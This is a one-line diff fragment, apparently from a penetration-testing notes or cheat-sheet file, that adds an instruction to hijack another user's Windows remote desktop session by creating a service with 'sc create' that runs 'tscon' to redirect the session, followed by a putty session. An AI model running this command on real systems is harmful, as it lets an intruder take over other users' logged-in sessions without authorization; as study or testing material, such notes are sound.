@@ -1,0 +1,1 @@
+Hijack his Session using sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>" then use putty session
